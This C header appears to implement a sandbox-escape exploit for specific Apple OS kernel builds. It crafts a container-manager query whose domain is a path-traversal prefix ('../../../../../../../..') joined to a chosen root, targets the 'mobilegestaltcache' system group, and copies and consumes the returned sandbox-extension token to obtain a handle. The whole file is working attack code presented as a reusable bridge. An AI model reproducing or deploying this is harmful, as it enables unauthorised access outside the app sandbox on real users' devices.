#ifndef XF_CONTAINER_GRANT_H
#define XF_CONTAINER_GRANT_H
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

/* Match the four kernel builds selected by the supplied 3105 executable.
 * A marketing OS version does not establish compatibility with this route. */
static inline bool XFContainerGrantBuildSupported(const char *build, size_t length) {
    static const char builds[4][10] = {"24A5355q", "24A5370h", "24A5380h", "24A5390f"};
    if (!build || length != 8) return false;
    for (size_t row = 0; row < 4; ++row) {
        bool equal = true;
        for (size_t column = 0; column < length; ++column)
            if (build[column] != builds[row][column]) { equal = false; break; }
        if (equal) return true;
    }
    return false;
}

typedef enum {
    XFContainerGrantOK = 0,
    XFContainerGrantInvalidInput = 1,
    XFContainerGrantMissingAPI = 2,
    XFContainerGrantAllocation = 3,
    XFContainerGrantQuery = 4,
    XFContainerGrantToken = 5,
    XFContainerGrantConsume = 6
} XFContainerGrantStage;

typedef struct {
    void *(*newQuery)(void);
    void (*queryClass)(void *, uint64_t);
    void (*queryGroups)(void *, void *);
    void (*queryFlags)(void *, uint64_t);
    void (*queryPart)(void *, uint64_t);
    void (*queryPartDomain)(void *, const char *);
    void *(*queryResult)(void *);
    void (*freeQuery)(void *);
    char *(*copyToken)(void *);
    void *(*xpcString)(const char *);
    void (*xpcRelease)(void *);
    int64_t (*consume)(const char *);
    int (*release)(int64_t);
    void *(*allocate)(size_t);
    void (*freeBytes)(void *);
} XFContainerGrantAPI;

/* Independent bridge for the token-grant sequence found in 3105. The caller
 * must supply a validated app/group UUID root and a supported kernel build.
 * No filesystem create/write/delete operation is performed by this bridge.
 * Success transfers an owned extension handle, including the valid handle 0.
 */
static inline int64_t XFContainerGrantAcquire(const XFContainerGrantAPI *api,
                                              const char *root,
                                              XFContainerGrantStage *stage) {
    if (stage) *stage = XFContainerGrantInvalidInput;
    if (!stage || !api || !root || root[0] != '/') return -1;
    size_t rootLength = 0;
    while (rootLength <= 4096 && root[rootLength]) ++rootLength;
    if (!rootLength || rootLength > 4096) return -1;
    *stage = XFContainerGrantMissingAPI;
    if (!api->newQuery || !api->queryClass || !api->queryGroups || !api->queryFlags ||
        !api->queryPart || !api->queryPartDomain || !api->queryResult || !api->freeQuery ||
        !api->copyToken || !api->xpcString || !api->xpcRelease || !api->consume ||
        !api->release || !api->allocate || !api->freeBytes) return -1;

    static const char prefix[] = "../../../../../../../..";
    size_t prefixLength = sizeof(prefix) - 1;
    *stage = XFContainerGrantAllocation;
    char *domain = (char *)api->allocate(prefixLength + rootLength + 1);
    if (!domain) return -1;
    for (size_t i = 0; i < prefixLength; ++i) domain[i] = prefix[i];
    for (size_t i = 0; i <= rootLength; ++i) domain[prefixLength + i] = root[i];
    void *query = api->newQuery();
    if (!query) { api->freeBytes(domain); return -1; }
    void *identifier = api->xpcString("systemgroup.com.apple.mobilegestaltcache");
    if (!identifier) {
        api->freeQuery(query); api->freeBytes(domain); return -1;
    }
    api->queryClass(query, 13);
    api->queryGroups(query, identifier);
    api->queryPart(query, 3);
    api->queryPartDomain(query, domain);
    api->queryFlags(query, UINT64_C(0x8000000000));
    *stage = XFContainerGrantQuery;
    void *borrowed = api->queryResult(query);
    int64_t handle = -1;
    char *token = NULL;
    if (borrowed) {
        *stage = XFContainerGrantToken;
        token = api->copyToken(borrowed);
        if (token && token[0]) {
            *stage = XFContainerGrantConsume;
            handle = api->consume(token);
            if (handle >= 0) *stage = XFContainerGrantOK;
        }
    }
    if (token) api->freeBytes(token);
    api->freeQuery(query);
    api->xpcRelease(identifier);
    api->freeBytes(domain);
    return handle;
}
#endif
